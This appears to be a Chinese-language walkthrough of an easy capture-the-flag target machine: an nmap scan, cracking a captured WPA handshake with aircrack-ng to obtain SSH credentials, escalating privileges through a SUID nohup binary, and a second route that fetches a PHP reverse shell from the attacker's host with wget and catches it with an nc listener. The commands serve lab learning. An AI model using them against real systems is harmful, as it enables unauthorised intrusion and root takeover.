> 无线流量破解得到SSH用户密码，nohup提权
## 靶机信息
- 级别:容易
- 不允许暴力破解SSH

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.155
sudo nmap -sT --min-rate 10000 -p- 192.168.1.155
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
8999/tcp open  bctp
9000/tcp open  cslistener
```

## Web
![[Pasted image 20231014124820.png]]

![[Pasted image 20231014125605.png]]
```shell
wireshark WPA-01.cap
```
![[Pasted image 20231014130218.png]]
```shell
//是一个无线的流量
//爆破密码
aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap
```
![[Pasted image 20231014130558.png]]
```shell
//通过无线路由器的流量破解得到一组凭证
dlink,p4ssword
```

## 提权
```shell
find / -type f -perm -u=s 2>/dev/null
/usr/bin/nohup

/usr/bin/nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)" //GTFOBins
```
![[Pasted image 20231014131603.png]]

> `nohup` 是一个Unix和Linux系统中的命令，它用于在后台运行一个命令，即使在终端会话退出后也能保持运行。`nohup` 的名称是 "no hang up" 的缩写，它最初的目的是在网络和终端连接断开时保持命令运行。

`nohup` 命令的一般语法如下：

```
nohup command-to-run &
```

其中：
- `command-to-run` 代表你要在后台运行的命令，可以是任何合法的Unix/Linux命令。
- `&` 符号表示将该命令放入后台运行。

使用 `nohup` 的主要优点是，它会将命令的输出重定向到一个名为 `nohup.out` 的文件，这样你可以在后台运行的命令中查看输出信息，而不会干扰你的终端会话。此外，即使你关闭了终端会话，命令也会继续运行，直到它完成或者你手动停止它。

示例用法：
```bash
nohup ./my-script.sh &
```

这个命令会在后台运行名为 `my-script.sh` 的脚本，并将输出重定向到 `nohup.out` 文件。这对于长时间运行的任务或远程服务器上的任务非常有用。当你需要在终端退出后继续运行某个命令，并且保留输出记录时，`nohup` 是一个很有用的工具。

## 提权2
```shell
find / -type d  -writable 2>/dev/null //查找所有可写的目录
```
![[Pasted image 20231014152731.png]]
```shell
files文件夹属于root且完全可写
```
![[Pasted image 20231014152820.png]]
是9000端口的网页文件
```shell
php -S 0:80
靶机的/var/www/bolt/public/files目录下
wget http://kaliIP/shell.php
kali nc -lvnp 1234
网页中执行php文件
http://192.168.1.155:9000/files/shell.php
成功得到root权限
```
